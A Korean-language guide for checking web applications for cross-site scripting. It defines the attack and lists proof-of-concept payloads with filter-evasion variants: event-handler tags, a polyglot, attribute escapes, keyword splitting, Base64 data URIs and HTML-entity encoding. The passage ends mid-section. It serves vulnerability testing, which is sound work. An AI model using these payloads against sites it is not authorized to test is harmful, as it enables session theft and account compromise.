# Cross-Site Scripting (XSS) 취약점 점검 가이드

이 문서는 웹 애플리케이션의 XSS(Cross-Site Scripting) 취약점을 점검하고 대응하기 위한 페이로드와 조치 방법을 정리한 가이드입니다.

---

## 1. XSS 정의 & 원리 💡

**XSS (Cross-Site Scripting)**는 공격자가 웹 애플리케이션에 악의적인 스크립트를 삽입하여 다른 사용자의 브라우저에서 실행되게 하는 공격 기법입니다. 사용자가 입력한 값을 검증 없이 그대로 페이지에 표시할 때 발생하며, 이 스크립트를 통해 공격자는 사용자의 세션 쿠키 탈취, 개인정보 유출, 악성 사이트 리다이렉션 등 다양한 악의적 행위를 할 수 있습니다.

**핵심 원리**는 애플리케이션이 사용자의 입력을 '신뢰할 수 없는 데이터'로 취급하지 않고, '실행 가능한 코드'의 일부로 해석하여 페이지를 동적으로 생성할 때 발생합니다.

---

## 2. 기본 페이로드 💉

가장 일반적이고 기본적인 형태의 XSS 페이로드입니다.

- **기본 스크립트 태그**
  - `<script>` 태그를 사용하여 직접 자바스크립트를 실행합니다.
    ```html
    <script>alert(1111)</script>
    ```

- **`<script>` 태그 우회**
  - `<script>`와 같은 일반적인 태그 사용이 차단되었을 때, 다른 태그의 이벤트 핸들러를 이용합니다.
    ```html
    <details onpointerover=confirm(1111)></details>
    <svg/onload=confirm(1111)/>
    ```

- **속성(Attribute) 값 내부에서 실행**
  - HTML 태그의 속성 값 내부에서 이벤트 핸들러를 삽입하여 사용자의 특정 행동(키 입력, 포커스 등) 시 스크립트가 동작하게 합니다. 버튼 클릭과 같은 사용자 인터랙션이 필요할 수 있습니다.
    ```html
    " onkeydown=confirm(1111) contenteditable onfocus="
    ```
    *`contenteditable`과 `onfocus`를 함께 사용하면 해당 요소에 포커스가 갈 때 바로 스크립트가 실행되도록 유도할 수 있습니다.*

- **Polyglot XSS**
  - 다양한 웹 환경(HTML, JavaScript, URL 등)에서 모두 유효하게 해석되어 실행될 수 있는 단일 페이로드입니다. 복잡한 필터링 환경을 우회하는 데 효과적입니다.
    ```javascript
    javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(1)>>>
    ```

---

## 3. 상황별 우회 페이로드 및 점검 방법 ⚙️

다양한 필터링 환경과 코드 컨텍스트에 따라 XSS를 성공시키기 위한 방법들입니다.

### 3.1. 컨텍스트(Context) 분석 및 탈출

먼저 입력 값이 HTML 문서의 어느 위치에 삽입되는지 파악하는 것이 중요합니다.

- **태그의 속성 값 내부에 입력될 경우**
  - `"` (큰따옴표)나 `'` (작은따옴표)를 닫아 기존 속성을 탈출하고, 새로운 이벤트 핸들러 속성을 삽입합니다.
  - **[예시]** `<input type="text" value="[입력 값]">`
    ```html
    <input type="text" value="" onpointerover=confirm(1111)">
    ```

- **태그와 태그 사이에 입력될 경우**
  - `</tag>`로 기존 태그를 닫거나, 새로운 태그(`<script>`, `<svg>` 등)를 삽입합니다.
  - **[예시]** `<a href="test.com">[입력 값]</a>`
    ```html
    <a href="test.com"></a><script>alert(1111)</script></a>
    ```

### 3.2. 주요 특수문자 필터링 우회

| 필터링 문자 | 우회 기법 및 페이로드 예시                                                                                             |
| :---------- | :----------------------------------------------------------------------------------------------------------------- |
| **< , >** | 입력 값이 태그 속성으로 들어갈 때, 태그 생성 없이 이벤트 핸들러만 삽입합니다.<br> `<input value="test" onpointerover=confirm(1111)/>` |
| **( , )** | 백틱(`` ` ``)을 사용하여 함수를 호출합니다. (일부 브라우저에서만 동작)<br> `<img src=x onerror=alert`1`>`                         |
| **" , '** | 태그 속성 값에 따옴표가 필요 없는 경우, 따옴표 없이 페이로드를 작성합니다.<br> `<svg onload=alert(1)>`                             |
| **공백(space)** | 슬래시(`/`)를 공백 대신 사용합니다. (주로 SVG 태그에서 유효)<br> `<svg/onload=alert(1)/>`                                       |

### 3.3. 키워드 및 함수 필터링 우회

- **`script` 키워드 필터링**
  - **단어 중간에 키워드 삽입**: 필터링 로직이 `script`를 찾아 제거할 경우, 이를 역이용합니다.
    ```html
    <scr<script>ipt>alert(1111)</scr<script>ipt>
    ```
  - **다른 태그 사용**: `<svg>`, `<img>`, `<details>`, `<iframe>` 등 스크립트 실행이 가능한 다른 태그를 활용합니다.
    ```html
    <img src=x onerror=alert(1)>
    ```

- **`alert`, `confirm`, `prompt` 함수 필터링**
  - **문자열 조합**: 문자열을 합치거나 `window` 객체를 통해 함수를 동적으로 호출합니다.
    ```html
    <svg onload="window['ale'+'rt'](1)"></svg>
    <iframe onload="this.contentWindow.constructor.constructor('alert(1)')()"></iframe>
    ```
  - **Base64 인코딩**: `data:` 스킴과 Base64 인코딩을 활용해 스크립트를 숨깁니다.
    ```html
    <meta HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMTExKTwvc2NyaXB0Pg==">
    ```
    *위 Base64는 `<script>alert(1111)</script>`를 인코딩한 값입니다.*

### 3.4. 인코딩을 이용한 우회

- 필터링 시스템이 특정 인코딩만 해석하는 경우, 다른 종류의 인코딩을 사용하여 우회할 수 있습니다.
- **HTML Entity 인코딩**: `href`, `src` 등 일부 속성에서는 HTML 엔티티가 디코딩되어 실행됩니다.
  ```html
  <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">Click Me</a>
